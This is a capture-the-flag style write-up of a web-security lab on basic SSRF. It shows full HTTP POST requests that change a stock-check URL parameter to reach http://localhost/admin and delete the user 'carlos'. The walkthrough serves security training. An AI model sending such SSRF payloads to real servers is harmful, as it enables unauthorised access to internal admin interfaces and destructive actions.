---
tags:
  - ssrf
---
# Basic SSRF against the local server

## Instructions

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

## Solution

Checking the stock of an item sends the following request:

```text title="Initial stock check" hl_lines="19"
POST /product/stock HTTP/1.1
Host: 0a85006e04b1b88482b63daa007600e1.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://0a85006e04b1b88482b63daa007600e1.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: https://0a85006e04b1b88482b63daa007600e1.web-security-academy.net
Connection: keep-alive
Cookie: session=l4jOdFtuL3McNvQR3uAr6rvmekArDVFZ
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-PwnFox-Color: magenta
Priority: u=0

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1 
```

Note that the stockAPI is making a call to `http://stock.weliketoshop.net/...`. 

We can try to change that to `localhost/admin` to see if we can get anything.

Change the body of the POST request to `stockApi=http://localhost/admin`. Be sure to remove the storeId parameter or it will return "not found". 

When we send this we see the endpoints to delete the users.

![](attachments/ssrf-lab-1/file-20251121082955910.png)

Send the following POST request to solve the lab.

```text title="Delete carlos"
POST /product/stock HTTP/1.1
Host: 0a85006e04b1b88482b63daa007600e1.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://0a85006e04b1b88482b63daa007600e1.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: https://0a85006e04b1b88482b63daa007600e1.web-security-academy.net
Connection: keep-alive
Cookie: session=l4jOdFtuL3McNvQR3uAr6rvmekArDVFZ
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-PwnFox-Color: magenta
Priority: u=0

stockApi=http%3A%2F%2Flocalhost%2Fadmin%2Fdelete%3Fusername%3Dcarlos
```

